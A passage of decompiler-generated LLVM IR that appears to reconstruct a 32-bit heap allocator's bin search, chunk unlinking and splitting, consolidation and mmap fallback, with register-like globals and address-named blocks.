  %v2_804fa74 = sdiv i32 %v0_804fa68, 32
  store i32 %v2_804fa74, i32* %edx.global-to-local, align 4
  br i1 %v2_804fa6a, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_804fa68
  %v5_804fa77 = shl i32 1, %v1_804fa6a
  store i32 %v5_804fa77, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_804fa68, %bb
  %v5_804fa79 = phi i32 [ 1, %dec_label_pc_804fa68 ], [ %v5_804fa77, %bb ]
  %v1_804fa79 = mul nsw i32 %v2_804fa74, 4
  %v2_804fa79 = add i32 %v1_804fa79, ptrtoint (i32* @global_var_805b874.123 to i32)
  %v3_804fa79 = inttoptr i32 %v2_804fa79 to i32*
  %v4_804fa79 = load i32, i32* %v3_804fa79, align 4
  %v6_804fa79 = or i32 %v4_804fa79, %v5_804fa79
  store i32 %v6_804fa79, i32* %v3_804fa79, align 4
  %v0_804fa80 = load i32, i32* @ebx, align 4
  %v1_804fa80 = load i32, i32* @ebp, align 4
  %v2_804fa80 = add i32 %v1_804fa80, 12
  %v3_804fa80 = inttoptr i32 %v2_804fa80 to i32*
  store i32 %v0_804fa80, i32* %v3_804fa80, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804fa87 = load i32, i32* @ebp, align 4
  %v2_804fa87 = add i32 %v1_804fa87, 8
  %v3_804fa87 = inttoptr i32 %v2_804fa87 to i32*
  store i32 %stack_var_-64.1, i32* %v3_804fa87, align 4
  %v0_804fa8a = load i32, i32* @ebp, align 4
  %v1_804fa8a = load i32, i32* @ebx, align 4
  %v2_804fa8a = add i32 %v1_804fa8a, 8
  %v3_804fa8a = inttoptr i32 %v2_804fa8a to i32*
  store i32 %v0_804fa8a, i32* %v3_804fa8a, align 4
  %v0_804fa8d = load i32, i32* @ebp, align 4
  %v1_804fa8d = load i32, i32* @esi, align 4
  %v2_804fa8d = add i32 %v1_804fa8d, 12
  %v3_804fa8d = inttoptr i32 %v2_804fa8d to i32*
  store i32 %v0_804fa8d, i32* %v3_804fa8d, align 4
  %v0_804fa90 = load i32, i32* @global_var_805b580.122, align 128
  store i32 %v0_804fa90, i32* @ebp, align 4
  %v9_804fa96 = icmp eq i32 %v0_804fa90, 134591860
  %v1_804fa9c = icmp eq i1 %v9_804fa96, false
  br i1 %v1_804fa9c, label %dec_label_pc_804f9bf, label %dec_label_pc_804faa2

dec_label_pc_804faa2:                             ; preds = %bb84, %dec_label_pc_804fa90.preheader
  br i1 %v8_804f953, label %dec_label_pc_804fb30, label %dec_label_pc_804fab0

dec_label_pc_804fab0:                             ; preds = %dec_label_pc_804faa2
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804fab4 = mul i32 %stack_var_-40.0.ph, 8
  %v2_804fab4 = add i32 %v1_804fab4, ptrtoint (i32* @global_var_805b56c.119 to i32)
  store i32 %v2_804fab4, i32* %edx.global-to-local, align 4
  %v1_804fabb = add i32 %v1_804fab4, add (i32 ptrtoint (i32* @global_var_805b56c.119 to i32), i32 12)
  %v2_804fabb = inttoptr i32 %v1_804fabb to i32*
  %storemerge1.pre = load i32, i32* %v2_804fabb, align 4
  br label %dec_label_pc_804fb2c

dec_label_pc_804fac0:                             ; preds = %dec_label_pc_804fb2c
  %v1_804fac0 = add i32 %v4_804fad7, 4
  %v2_804fac0 = inttoptr i32 %v1_804fac0 to i32*
  %v3_804fac0 = load i32, i32* %v2_804fac0, align 4
  store i32 %v3_804fac0, i32* %ebx.global-to-local, align 4
  %v1_804fac3 = add i32 %v4_804fad7, 12
  %v2_804fac3 = inttoptr i32 %v1_804fac3 to i32*
  %v3_804fac3 = load i32, i32* %v2_804fac3, align 4
  store i32 %v3_804fac3, i32* @ecx, align 4
  %v1_804fac6 = and i32 %v3_804fac0, -4
  store i32 %v1_804fac6, i32* @ebx, align 4
  %v10_804fac9 = icmp ult i32 %v1_804fac6, %v1_804fca2
  br i1 %v10_804fac9, label %dec_label_pc_804fb2c, label %dec_label_pc_804facf

dec_label_pc_804facf:                             ; preds = %dec_label_pc_804fac0
  %v1_804facf = add i32 %v4_804fad7, 8
  %v2_804facf = inttoptr i32 %v1_804facf to i32*
  %v3_804facf = load i32, i32* %v2_804facf, align 4
  store i32 %v3_804facf, i32* @edx, align 4
  %v1_804fad2 = add i32 %v3_804facf, 12
  %v2_804fad2 = inttoptr i32 %v1_804fad2 to i32*
  %v3_804fad2 = load i32, i32* %v2_804fad2, align 4
  %v15_804fad2 = icmp eq i32 %v3_804fad2, %v4_804fad7
  %v1_804fad5 = icmp eq i1 %v15_804fad2, false
  br i1 %v1_804fad5, label %dec_label_pc_804fadc, label %dec_label_pc_804fad7

dec_label_pc_804fad7:                             ; preds = %dec_label_pc_804facf
  %v1_804fad7 = add i32 %v3_804fac3, 8
  %v2_804fad7 = inttoptr i32 %v1_804fad7 to i32*
  %v3_804fad7 = load i32, i32* %v2_804fad7, align 4
  %v15_804fad7 = icmp eq i32 %v3_804fad7, %v4_804fad7
  br i1 %v15_804fad7, label %dec_label_pc_804fae1, label %dec_label_pc_804fadc

dec_label_pc_804fadc:                             ; preds = %dec_label_pc_804fad7, %dec_label_pc_804facf
  %v0_804fadc = call i32 @abort()
  store i32 %v0_804fadc, i32* %eax.global-to-local, align 4
  %v0_804fae1.pre = load i32, i32* @ebx, align 4
  %v0_804fae7.pre = load i32, i32* @ecx, align 4
  %v1_804fae7.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804fae1

dec_label_pc_804fae1:                             ; preds = %dec_label_pc_804fad7, %dec_label_pc_804fadc
  %v1_804fae7 = phi i32 [ %v3_804facf, %dec_label_pc_804fad7 ], [ %v1_804fae7.pre, %dec_label_pc_804fadc ]
  %v0_804fae7 = phi i32 [ %v3_804fac3, %dec_label_pc_804fad7 ], [ %v0_804fae7.pre, %dec_label_pc_804fadc ]
  %v0_804fae1 = phi i32 [ %v1_804fac6, %dec_label_pc_804fad7 ], [ %v0_804fae1.pre, %dec_label_pc_804fadc ]
  %v5_804fae3 = sub i32 %v0_804fae1, %v1_804fca2
  store i32 %v5_804fae3, i32* %esi.global-to-local, align 4
  %v2_804fae7 = add i32 %v1_804fae7, 12
  %v3_804fae7 = inttoptr i32 %v2_804fae7 to i32*
  store i32 %v0_804fae7, i32* %v3_804fae7, align 4
  %v0_804faea = load i32, i32* @edx, align 4
  %v1_804faea = load i32, i32* @ecx, align 4
  %v2_804faea = add i32 %v1_804faea, 8
  %v3_804faea = inttoptr i32 %v2_804faea to i32*
  store i32 %v0_804faea, i32* %v3_804faea, align 4
  %v0_804faed = load i32, i32* %esi.global-to-local, align 4
  %v0_804faf0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804faf0 = add i32 %v0_804faf0, 8
  store i32 %v1_804faf0, i32* %ecx.global-to-local, align 4
  %tmp127 = icmp ult i32 %v0_804faed, 16
  br i1 %tmp127, label %dec_label_pc_804fff1, label %dec_label_pc_804faf9

dec_label_pc_804faf9:                             ; preds = %dec_label_pc_804fae1
  %v2_804fafd = add i32 %v0_804faf0, %v1_804fca2
  store i32 %v2_804fafd, i32* %edx.global-to-local, align 4
  %v1_804fb00 = or i32 %v1_804fca2, 1
  store i32 %v1_804fb00, i32* %ebx.global-to-local, align 4
  %v2_804fb03 = add i32 %v0_804faf0, 4
  %v3_804fb03 = inttoptr i32 %v2_804fb03 to i32*
  store i32 %v1_804fb00, i32* %v3_804fb03, align 4
  %v0_804fb06 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fb08 = or i32 %v0_804fb06, 1
  store i32 %v1_804fb08, i32* %eax.global-to-local, align 4
  %v0_804fb0b = load i32, i32* %edx.global-to-local, align 4
  %v1_804fb0b = load i32, i32* @ebp, align 4
  %v2_804fb0b = add i32 %v1_804fb0b, 8
  %v3_804fb0b = inttoptr i32 %v2_804fb0b to i32*
  store i32 %v0_804fb0b, i32* %v3_804fb0b, align 4
  %v0_804fb0e = load i32, i32* %edx.global-to-local, align 4
  %v1_804fb0e = load i32, i32* @ebp, align 4
  %v2_804fb0e = add i32 %v1_804fb0e, 12
  %v3_804fb0e = inttoptr i32 %v2_804fb0e to i32*
  store i32 %v0_804fb0e, i32* %v3_804fb0e, align 4
  %v0_804fb11 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fb11 = add i32 %v0_804fb11, 8
  %v2_804fb11 = inttoptr i32 %v1_804fb11 to i32*
  store i32 ptrtoint (i32* @global_var_805b574.121 to i32), i32* %v2_804fb11, align 4
  %v0_804fb18 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fb18 = add i32 %v0_804fb18, 12
  %v2_804fb18 = inttoptr i32 %v1_804fb18 to i32*
  store i32 ptrtoint (i32* @global_var_805b574.121 to i32), i32* %v2_804fb18, align 4
  %v0_804fb1f = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb1f = load i32, i32* %edx.global-to-local, align 4
  %v2_804fb1f = add i32 %v1_804fb1f, 4
  %v3_804fb1f = inttoptr i32 %v2_804fb1f to i32*
  store i32 %v0_804fb1f, i32* %v3_804fb1f, align 4
  %v0_804fb22 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fb22 = load i32, i32* %edx.global-to-local, align 4
  %v3_804fb22 = add i32 %v1_804fb22, %v0_804fb22
  %v4_804fb22 = inttoptr i32 %v3_804fb22 to i32*
  store i32 %v0_804fb22, i32* %v4_804fb22, align 4
  br label %dec_label_pc_804fff6

dec_label_pc_804fb2c:                             ; preds = %dec_label_pc_804fac0, %dec_label_pc_804fab0
  %v4_804fad7 = phi i32 [ %storemerge1.pre, %dec_label_pc_804fab0 ], [ %v3_804fac3, %dec_label_pc_804fac0 ]
  store i32 %v4_804fad7, i32* %eax.global-to-local, align 4
  %v12_804fb2c = icmp eq i32 %v4_804fad7, %v2_804fab4
  %v1_804fb2e = icmp eq i1 %v12_804fb2c, false
  br i1 %v1_804fb2e, label %dec_label_pc_804fac0, label %dec_label_pc_804fb30.loopexit

dec_label_pc_804fb30.loopexit:                    ; preds = %dec_label_pc_804fb2c
  br label %dec_label_pc_804fb30

dec_label_pc_804fb30:                             ; preds = %dec_label_pc_804fb30.loopexit, %dec_label_pc_804faa2
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804fb39 = add i32 %stack_var_-40.0.ph, 1
  %v2_804fb3c = udiv i32 %v1_804fb39, 32
  store i32 %v2_804fb3c, i32* @edi, align 4
  %v1_804fb3f = mul i32 %v1_804fb39, 8
  %v2_804fb3f = add i32 %v1_804fb3f, ptrtoint (i32* @global_var_805b56c.119 to i32)
  store i32 %v2_804fb3f, i32* %ebx.global-to-local, align 4
  %v1_804fb46 = urem i32 %v1_804fb39, 32
  %v2_804fb46 = icmp eq i32 %v1_804fb46, 0
  store i32 %v1_804fb46, i32* %ecx.global-to-local, align 4
  %v1_804fb49 = mul nuw nsw i32 %v2_804fb3c, 4
  %v2_804fb49 = add i32 %v1_804fb49, ptrtoint (i32* @global_var_805b874.123 to i32)
  %v3_804fb49 = inttoptr i32 %v2_804fb49 to i32*
  %v4_804fb49 = load i32, i32* %v3_804fb49, align 4
  store i32 %v4_804fb49, i32* %edx.global-to-local, align 4
  br i1 %v2_804fb46, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_804fb30
  %v5_804fb50 = shl i32 1, %v1_804fb46
  store i32 %v5_804fb50, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804fb30, %bb85, %dec_label_pc_804fb91
  %v1_804fb52 = phi i32 [ %v1_804fb52.pre, %dec_label_pc_804fb91 ], [ %v4_804fb49, %bb85 ], [ %v4_804fb49, %dec_label_pc_804fb30 ]
  %v0_804fb56 = phi i32 [ %v0_804fb52.pre, %dec_label_pc_804fb91 ], [ %v5_804fb50, %bb85 ], [ 1, %dec_label_pc_804fb30 ]
  %tmp86 = icmp ule i32 %v0_804fb56, %v1_804fb52
  %v1_804fb56 = icmp eq i32 %v0_804fb56, 0
  %v1_804fb58 = icmp eq i1 %v1_804fb56, false
  %or.cond = and i1 %tmp86, %v1_804fb58
  br i1 %or.cond, label %dec_label_pc_804fb56.dec_label_pc_804fb86.preheader_crit_edge, label %dec_label_pc_804fb5a.preheader

dec_label_pc_804fb56.dec_label_pc_804fb86.preheader_crit_edge: ; preds = %.preheader
  %v0_804fb8112.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb86.preheader

dec_label_pc_804fb5a.preheader:                   ; preds = %.preheader
  %v0_804fb5a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804fb5a

dec_label_pc_804fb5a:                             ; preds = %dec_label_pc_804fb5a.preheader, %dec_label_pc_804fb64
  %v0_804fb5a = phi i32 [ %v0_804fb5a.pre, %dec_label_pc_804fb5a.preheader ], [ %v1_804fb5a, %dec_label_pc_804fb64 ]
  %v1_804fb5a = add i32 %v0_804fb5a, 1
  store i32 %v1_804fb5a, i32* @edi, align 4
  %v6_804fb5e = icmp ugt i32 %v1_804fb5a, 2
  br i1 %v6_804fb5e, label %dec_label_pc_804fc0d.loopexit, label %dec_label_pc_804fb64

dec_label_pc_804fb64:                             ; preds = %dec_label_pc_804fb5a
  %v1_804fb64 = mul i32 %v1_804fb5a, 4
  %v2_804fb64 = add i32 %v1_804fb64, ptrtoint (i32* @global_var_805b874.123 to i32)
  %v3_804fb64 = inttoptr i32 %v2_804fb64 to i32*
  %v4_804fb64 = load i32, i32* %v3_804fb64, align 4
  store i32 %v4_804fb64, i32* %edx.global-to-local, align 4
  %v1_804fb6b = icmp eq i32 %v4_804fb64, 0
  br i1 %v1_804fb6b, label %dec_label_pc_804fb5a, label %dec_label_pc_804fb6f

dec_label_pc_804fb6f:                             ; preds = %dec_label_pc_804fb64
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804fb76 = mul i32 %v1_804fb5a, 256
  store i32 %v2_804fb76, i32* %eax.global-to-local, align 4
  %v1_804fb79 = add i32 %v2_804fb76, ptrtoint (i32* @global_var_805b56c.119 to i32)
  store i32 %v1_804fb79, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb86.preheader

dec_label_pc_804fb86.preheader:                   ; preds = %dec_label_pc_804fb56.dec_label_pc_804fb86.preheader_crit_edge, %dec_label_pc_804fb6f
  %v0_804fb8112 = phi i32 [ %v1_804fb79, %dec_label_pc_804fb6f ], [ %v0_804fb8112.pre, %dec_label_pc_804fb56.dec_label_pc_804fb86.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804fb6f ], [ %v0_804fb56, %dec_label_pc_804fb56.dec_label_pc_804fb86.preheader_crit_edge ]
  %v0_804fb98 = phi i32 [ %v4_804fb64, %dec_label_pc_804fb6f ], [ %v1_804fb52, %dec_label_pc_804fb56.dec_label_pc_804fb86.preheader_crit_edge ]
  %v2_804fb864 = and i32 %v0_804fb98, %esi.promoted
  %v3_804fb865 = icmp eq i32 %v2_804fb864, 0
  br i1 %v3_804fb865, label %dec_label_pc_804fb81, label %dec_label_pc_804fb8a

dec_label_pc_804fb81:                             ; preds = %dec_label_pc_804fb86.preheader, %dec_label_pc_804fb81
  %v2_804fb8414 = phi i32 [ %v2_804fb84, %dec_label_pc_804fb81 ], [ %esi.promoted, %dec_label_pc_804fb86.preheader ]
  %v0_804fb8113 = phi i32 [ %v1_804fb81, %dec_label_pc_804fb81 ], [ %v0_804fb8112, %dec_label_pc_804fb86.preheader ]
  %v1_804fb81 = add i32 %v0_804fb8113, 8
  %v2_804fb84 = mul i32 %v2_804fb8414, 2
  %v2_804fb86 = and i32 %v2_804fb84, %v0_804fb98
  %v3_804fb86 = icmp eq i32 %v2_804fb86, 0
  br i1 %v3_804fb86, label %dec_label_pc_804fb81, label %dec_label_pc_804fb86.dec_label_pc_804fb8a_crit_edge

dec_label_pc_804fb86.dec_label_pc_804fb8a_crit_edge: ; preds = %dec_label_pc_804fb81
  store i32 %v1_804fb81, i32* %ebx.global-to-local, align 4
  store i32 %v2_804fb84, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fb8a

dec_label_pc_804fb8a:                             ; preds = %dec_label_pc_804fb86.dec_label_pc_804fb8a_crit_edge, %dec_label_pc_804fb86.preheader
  %v0_804fb9a = phi i32 [ %v2_804fb84, %dec_label_pc_804fb86.dec_label_pc_804fb8a_crit_edge ], [ %esi.promoted, %dec_label_pc_804fb86.preheader ]
  %v1_804fbb4 = phi i32 [ %v1_804fb81, %dec_label_pc_804fb86.dec_label_pc_804fb8a_crit_edge ], [ %v0_804fb8112, %dec_label_pc_804fb86.preheader ]
  %v1_804fb8a = add i32 %v1_804fbb4, 12
  %v2_804fb8a = inttoptr i32 %v1_804fb8a to i32*
  %v3_804fb8a = load i32, i32* %v2_804fb8a, align 4
  store i32 %v3_804fb8a, i32* %ecx.global-to-local, align 4
  %v12_804fb8d = icmp eq i32 %v3_804fb8a, %v1_804fbb4
  %v1_804fb8f = icmp eq i1 %v12_804fb8d, false
  br i1 %v1_804fb8f, label %dec_label_pc_804fba5, label %dec_label_pc_804fb91

dec_label_pc_804fb91:                             ; preds = %dec_label_pc_804fb8a
  %v1_804fb93 = add i32 %v3_804fb8a, 8
  store i32 %v1_804fb93, i32* %ebx.global-to-local, align 4
  %v1_804fb96 = sub i32 -1, %v0_804fb9a
  store i32 %v1_804fb96, i32* %eax.global-to-local, align 4
  %v2_804fb98 = and i32 %v0_804fb98, %v1_804fb96
  store i32 %v2_804fb98, i32* %edx.global-to-local, align 4
  %v2_804fb9a = mul i32 %v0_804fb9a, 2
  store i32 %v2_804fb9a, i32* %esi.global-to-local, align 4
  %v1_804fb9c = load i32, i32* @edi, align 4
  %v2_804fb9c = mul i32 %v1_804fb9c, 4
  %v3_804fb9c = add i32 %v2_804fb9c, ptrtoint (i32* @global_var_805b874.123 to i32)
  %v4_804fb9c = inttoptr i32 %v3_804fb9c to i32*
  store i32 %v2_804fb98, i32* %v4_804fb9c, align 4
  %v0_804fb52.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804fb52.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_804fba5:                             ; preds = %dec_label_pc_804fb8a
  %v1_804fba5 = add i32 %v3_804fb8a, 4
  %v2_804fba5 = inttoptr i32 %v1_804fba5 to i32*
  %v3_804fba5 = load i32, i32* %v2_804fba5, align 4
  store i32 %v3_804fba5, i32* %edx.global-to-local, align 4
  %v1_804fba8 = add i32 %v3_804fb8a, 12
  %v2_804fba8 = inttoptr i32 %v1_804fba8 to i32*
  %v3_804fba8 = load i32, i32* %v2_804fba8, align 4
  store i32 %v3_804fba8, i32* %eax.global-to-local, align 4
  %v1_804fbab = and i32 %v3_804fba5, -4
  store i32 %v1_804fbab, i32* %edx.global-to-local, align 4
  %v5_804fbb0 = sub i32 %v1_804fbab, %v1_804fca2
  store i32 %v5_804fbb0, i32* %esi.global-to-local, align 4
  store i32 %v3_804fba8, i32* %v2_804fb8a, align 4
  %v0_804fbb7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fbb7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fbb7 = add i32 %v1_804fbb7, 8
  %v3_804fbb7 = inttoptr i32 %v2_804fbb7 to i32*
  store i32 %v0_804fbb7, i32* %v3_804fbb7, align 4
  %v0_804fbba = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_804fbba, 16
  br i1 %tmp128, label %dec_label_pc_804fbbf, label %dec_label_pc_804fbc6

dec_label_pc_804fbbf:                             ; preds = %dec_label_pc_804fba5
  %v0_804fbbf = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fbbf = load i32, i32* %edx.global-to-local, align 4
  %v2_804fbbf = add i32 %v0_804fbbf, 4
  %v3_804fbbf = add i32 %v2_804fbbf, %v1_804fbbf
  %v4_804fbbf = inttoptr i32 %v3_804fbbf to i32*
  %v5_804fbbf = load i32, i32* %v4_804fbbf, align 4
  %v6_804fbbf = or i32 %v5_804fbbf, 1
  store i32 %v6_804fbbf, i32* %v4_804fbbf, align 4
  br label %dec_label_pc_804fc05

dec_label_pc_804fbc6:                             ; preds = %dec_label_pc_804fba5
  store i32 %v1_804fca2, i32* %eax.global-to-local, align 4
  %v0_804fbcf = load i32, i32* %ecx.global-to-local, align 4
  %v2_804fbcf = add i32 %v0_804fbcf, %v1_804fca2
  store i32 %v2_804fbcf, i32* %edx.global-to-local, align 4
  %v1_804fbd2 = load i32, i32* @ebp, align 4
  %v2_804fbd2 = add i32 %v1_804fbd2, 8
  %v3_804fbd2 = inttoptr i32 %v2_804fbd2 to i32*
  store i32 %v2_804fbcf, i32* %v3_804fbd2, align 4
  %v0_804fbd5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fbd5 = load i32, i32* @ebp, align 4
  %v2_804fbd5 = add i32 %v1_804fbd5, 12
  %v3_804fbd5 = inttoptr i32 %v2_804fbd5 to i32*
  store i32 %v0_804fbd5, i32* %v3_804fbd5, align 4
  %v0_804fbd8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fbd8 = add i32 %v0_804fbd8, 8
  %v2_804fbd8 = inttoptr i32 %v1_804fbd8 to i32*
  store i32 ptrtoint (i32* @global_var_805b574.121 to i32), i32* %v2_804fbd8, align 4
  %v0_804fbdf = load i32, i32* %edx.global-to-local, align 4
  %v1_804fbdf = add i32 %v0_804fbdf, 12
  %v2_804fbdf = inttoptr i32 %v1_804fbdf to i32*
  store i32 ptrtoint (i32* @global_var_805b574.121 to i32), i32* %v2_804fbdf, align 4
  br i1 %v6_804f95b, label %dec_label_pc_804fbee, label %dec_label_pc_804fbe8

dec_label_pc_804fbe8:                             ; preds = %dec_label_pc_804fbc6
  %v0_804fbe8 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804fbe8, i32* @global_var_805b570.120, align 16
  br label %dec_label_pc_804fbee

dec_label_pc_804fbee:                             ; preds = %dec_label_pc_804fbc6, %dec_label_pc_804fbe8
  %v4_804fbee = or i32 %v1_804fca2, 1
  %v0_804fbf3 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_804fbee, i32* %ebx.global-to-local, align 4
  %v1_804fbf9 = or i32 %v0_804fbf3, 1
  store i32 %v1_804fbf9, i32* %eax.global-to-local, align 4
  %v1_804fbfc = load i32, i32* %ecx.global-to-local, align 4
  %v2_804fbfc = add i32 %v1_804fbfc, 4
  %v3_804fbfc = inttoptr i32 %v2_804fbfc to i32*
  store i32 %v4_804fbee, i32* %v3_804fbfc, align 4
  %v0_804fbff = load i32, i32* %esi.global-to-local, align 4
  %v1_804fbff = load i32, i32* %edx.global-to-local, align 4
  %v3_804fbff = add i32 %v1_804fbff, %v0_804fbff
  %v4_804fbff = inttoptr i32 %v3_804fbff to i32*
  store i32 %v0_804fbff, i32* %v4_804fbff, align 4
  %v0_804fc02 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fc02 = load i32, i32* %edx.global-to-local, align 4
  %v2_804fc02 = add i32 %v1_804fc02, 4
  %v3_804fc02 = inttoptr i32 %v2_804fc02 to i32*
  store i32 %v0_804fc02, i32* %v3_804fc02, align 4
  br label %dec_label_pc_804fc05

dec_label_pc_804fc05:                             ; preds = %dec_label_pc_804fbbf, %dec_label_pc_804fbee
  %v0_804fc05 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fc05 = add i32 %v0_804fc05, 8
  store i32 %v1_804fc05, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050007

dec_label_pc_804fc0d.loopexit:                    ; preds = %dec_label_pc_804fb5a
  br label %dec_label_pc_804fc0d

dec_label_pc_804fc0d:                             ; preds = %dec_label_pc_804fc0d.loopexit, %dec_label_pc_804f915, %dec_label_pc_804f91d
  %v0_804fc0d = load i32, i32* @global_var_805b56c.119, align 4
  store i32 %v0_804fc0d, i32* @ebx, align 4
  %v1_804fc17 = add i32 %v1_804fca2, 16
  store i32 %v1_804fc17, i32* @esi, align 4
  %v1_804fc1a = add i32 %v0_804fc0d, 4
  %v2_804fc1a = inttoptr i32 %v1_804fc1a to i32*
  %v3_804fc1a = load i32, i32* %v2_804fc1a, align 4
  %v1_804fc21 = and i32 %v3_804fc1a, -4
  store i32 %v1_804fc21, i32* %ecx.global-to-local, align 4
  %v7_804fc24 = icmp ult i32 %v1_804fc21, %v1_804fc17
  br i1 %v7_804fc24, label %dec_label_pc_804fc44, label %dec_label_pc_804fc28

dec_label_pc_804fc28:                             ; preds = %dec_label_pc_804fc0d
  %v2_804fc2c = add i32 %v0_804fc0d, %v1_804fca2
  store i32 %v2_804fc2c, i32* %edx.global-to-local, align 4
  %v1_804fc2f = or i32 %v1_804fca2, 1
  store i32 %v1_804fc2f, i32* %eax.global-to-local, align 4
  store i32 %v2_804fc2c, i32* @global_var_805b56c.119, align 4
  store i32 %v1_804fc2f, i32* %v2_804fc1a, align 4
  %v0_804fc3b = load i32, i32* %ecx.global-to-local, align 4
  %v5_804fc3b = sub i32 %v0_804fc3b, %v1_804fca2
  store i32 %v5_804fc3b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ff97

dec_label_pc_804fc44:                             ; preds = %dec_label_pc_804fc0d
  %v0_804fc44 = load i32, i32* @global_var_805b89c.124, align 4
  store i32 %v0_804fc44, i32* %edx.global-to-local, align 4
  %v0_804fc4a = load i8, i8* @global_var_805b540.118, align 64
  %v1_804fc4a = and i8 %v0_804fc4a, 2
  %v2_804fc4a = icmp eq i8 %v1_804fc4a, 0
  br i1 %v2_804fc4a, label %dec_label_pc_804fc78, label %dec_label_pc_804fc53

dec_label_pc_804fc53:                             ; preds = %dec_label_pc_804fc44
  store i32 ptrtoint (i8* @global_var_805b540.118 to i32), i32* %stack_var_-92, align 4
  %v2_804fc5b = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805b540.118 to i32*))
  store i32 ptrtoint (i8* @global_var_805b540.118 to i32), i32* @ebx, align 4
  %v1_804fc65 = add i32 %v1_804fca2, -7
  store i32 %v1_804fc65, i32* %eax.global-to-local, align 4
  store i32 %v1_804fc65, i32* %stack_var_-92, align 4
  %v1_804fc69 = call i32 @malloc(i32 %v1_804fc65)
  store i32 %v1_804fc69, i32* %eax.global-to-local, align 4
  store i32 %v1_804fc69, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050007

dec_label_pc_804fc78:                             ; preds = %dec_label_pc_804fc44
  %v1_804fc78 = add i32 %v0_804fc44, -1
  store i32 %v1_804fc78, i32* %ecx.global-to-local, align 4
  store i32 %v1_804fca2, i32* @ebx, align 4
  %v1_804fc83 = load i32, i32* @global_var_805b88c.125, align 4
  %v7_804fc83 = icmp ult i32 %v1_804fca2, %v1_804fc83
  br i1 %v7_804fc83, label %dec_label_pc_804fd45, label %dec_label_pc_804fc8f

dec_label_pc_804fc8f:                             ; preds = %dec_label_pc_804fc78
  %v0_804fc8f = load i32, i32* @global_var_805b890.126, align 16
  store i32 %v0_804fc8f, i32* %eax.global-to-local, align 4
  %v1_804fc94 = load i32, i32* @global_var_805b894.127, align 4
  %v5_804fc9a = icmp slt i32 %v0_804fc8f, %v1_804fc94
  br i1 %v5_804fc9a, label %dec_label_pc_804fca0, label %dec_label_pc_804fd45

dec_label_pc_804fca0:                             ; preds = %dec_label_pc_804fc8f
  %v2_804fca2 = add i32 %v1_804fca2, 10
  %v3_804fca2 = add i32 %v2_804fca2, %v0_804fc44
  %v1_804fca6 = sub i32 0, %v0_804fc44
  store i32 %v1_804fca6, i32* %eax.global-to-local, align 4
  %v2_804fca8 = and i32 %v3_804fca2, %v1_804fca6
  store i32 %v2_804fca8, i32* @ebx, align 4
  %tmp129 = icmp ugt i32 %v2_804fca8, %v1_804fca2
  br i1 %tmp129, label %dec_label_pc_804fcb4, label %dec_label_pc_804fd45

dec_label_pc_804fcb4:                             ; preds = %dec_label_pc_804fca0
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804fcc1 = call i32 @mmap(i32 0, i32 %v2_804fca8, i32 3, i32 34, i32 0, i32 0, i32 %v1_804fc78, i32 %v1_804fc78)
  store i32 %v8_804fcc1, i32* %eax.global-to-local, align 4
  store i32 %v8_804fcc1, i32* %edx.global-to-local, align 4
  %v10_804fccb = icmp eq i32 %v8_804fcc1, -1
  br i1 %v10_804fccb, label %dec_label_pc_804fcb4.dec_label_pc_804fd45_crit_edge, label %dec_label_pc_804fcd0

dec_label_pc_804fcb4.dec_label_pc_804fd45_crit_edge: ; preds = %dec_label_pc_804fcb4
  %v0_804fd45.pre = load i32, i32* @global_var_805b56c.119, align 4
  br label %dec_label_pc_804fd45

dec_label_pc_804fcd0:                             ; preds = %dec_label_pc_804fcb4
  %v1_804fcd2 = urem i32 %v8_804fcc1, 8
  %v2_804fcd2 = icmp eq i32 %v1_804fcd2, 0
  store i32 %v1_804fcd2, i32* %ecx.global-to-local, align 4
  br i1 %v2_804fcd2, label %dec_label_pc_804fcea, label %dec_label_pc_804fcd7

dec_label_pc_804fcd7:                             ; preds = %dec_label_pc_804fcd0
  %v0_804fcdc = load i32, i32* @ebx, align 4
  %v2_804fcde = sub nsw i32 8, %v1_804fcd2
  store i32 %v2_804fcde, i32* %eax.global-to-local, align 4
  %v2_804fce0 = add i32 %v2_804fcde, %v8_804fcc1
  store i32 %v2_804fce0, i32* %edx.global-to-local, align 4
  %v2_804fce2 = sub i32 %v0_804fcdc, %v2_804fcde
  store i32 %v2_804fce2, i32* %esi.global-to-local, align 4
  %v2_804fce4 = inttoptr i32 %v2_804fce0 to i32*
  store i32 %v2_804fcde, i32* %v2_804fce4, align 4
  br label %dec_label_pc_804fcf2

dec_label_pc_804fcea:                             ; preds = %dec_label_pc_804fcd0
